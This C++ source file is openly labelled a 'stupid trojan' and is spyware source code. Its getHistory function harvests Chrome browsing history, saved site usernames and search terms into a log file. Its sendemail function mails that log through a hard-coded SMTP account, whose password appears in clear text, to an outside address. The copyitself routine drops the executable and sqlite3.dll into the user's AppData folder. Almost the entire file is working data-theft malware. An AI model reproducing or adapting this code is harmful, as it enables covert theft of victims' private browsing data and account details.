
#include "util.h"

void sendemail()
{
	bool bError = false;

	try
	{
		CSmtp mail;
		mail.SetSMTPServer("smtp.163.com", 25);
		mail.SetLogin("liutobepure@163.com");
		mail.SetPassword("xiaoliu123");
		mail.SetSenderName("stupid trojan");
		mail.SetSenderMail("liutobepure@163.com");
		mail.SetReplyTo("liutobepure@163.com");
		mail.SetSubject("The message");
		mail.AddRecipient("1025313214@qq.com");
		mail.SetXPriority(XPRIORITY_NORMAL);
		mail.SetXMailer("The Bat!");
		mail.AddMsgLine("Hello,");
		mail.AddMsgLine("");
		mail.AddMsgLine("...");
		mail.AddMsgLine("new chrome data is coming!");
		mail.AddMsgLine("");
		mail.AddMsgLine("Regards");
		mail.ModMsgLine(5, "regards");
		mail.DelMsgLine(2);
		mail.AddMsgLine("stupid trojan");

		char   buffer[MAX_PATH];
		getcwd(buffer, MAX_PATH);
		//mail.AddAttachment("../test1.jpg");
		strcat(buffer, "\\log");
		mail.AddAttachment(buffer);

		mail.Send();

	}
	catch (ECSmtp e)
	{
		//std::cout << "Error: " << e.GetErrorText().c_str() << ".\n";
		bError = true;
	}
	//if (!bError)
		//std::cout << "Mail was send successfully.\n";
}

void getHistory()
{
	BrowsHistory browseHistory;
	browseHistory.Init();
	while (!browseHistory.m_bStatus);	//等待获取完成  
	auto data = browseHistory.GetBrowsHistory();
	setlocale(LC_CTYPE, "");
	wofstream outfile("log");
	outfile.imbue(std::locale("CHS"));
	outfile << "The websites and the number of visited times: " << endl;
	for (auto it = data.begin(); it<data.end(); ++it)
	{
		//wcout << it->strURL.GetString() << "  " << it->nCount << endl;
		outfile << it->strURL.GetString() << "  " << it->nCount << endl;
	}


	outfile <<"The url and the account of these website: "<<endl;
	auto person = browseHistory.GetPersonInfo();
	for (auto it = person.begin(); it != person.end(); ++it)
	{
		outfile<< it->url.GetString() << "	" << it->username.GetString() << endl;
		//wcout<< it->url.GetString() << "	" << it->username.GetString() << endl;
	}

	outfile << "The items which are searched: "<<endl;
	auto search_term = browseHistory.GetSearchInfo();
	for(auto it=search_term.begin();it!=search_term.end();++it)
	{
		outfile << it->term.GetString()<<"	";
		//wcout << it->term.GetString() << "	";
	}
	outfile.close();
}


void copy()
{
	copyitself("\\stupid-trojan.exe");
	copyitself("\\sqlite3.dll");
}
void copyitself(const char *s)
{
	char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	//得到当前执行文件的全路径
	getcwd(pathtofile,MAX_PATH);
	strcat(pathtofile, s);
	//cout << getenv("homepath") << endl;
	strcpy(system, "C:");
	strcat(system, getenv("homepath"));
	strcat(system, "\\AppData\\Local");
	strcat(system, s);
	//cout << pathtofile << "  " << system << endl;
	if(strcmp(system,pathtofile))
	{
		ifstream source(pathtofile, ios::binary);
		ofstream dest(system, ios::binary);

		istreambuf_iterator<char> begin_source(source);
		istreambuf_iterator<char> end_source;
		ostreambuf_iterator<char> begin_dest(dest);
		copy(begin_source, end_source, begin_dest);

		source.close();
		dest.close();
	}
	
	//getchar();
}


